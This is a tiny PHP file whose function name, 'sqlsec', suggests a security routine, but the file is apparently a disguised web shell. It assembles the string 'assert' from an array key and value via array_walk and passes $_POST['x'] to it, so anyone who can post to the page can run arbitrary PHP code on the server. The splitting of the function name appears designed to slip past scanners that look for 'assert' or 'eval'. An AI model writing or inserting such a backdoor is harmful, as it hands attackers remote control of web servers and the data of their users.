<?php
    function sqlsec($value,$key)
    {   
        $x = $key.$value;
        $x($_POST['x']);
    }
    $a=array("ass"=>"ert");
    array_walk($a,"sqlsec");
?>
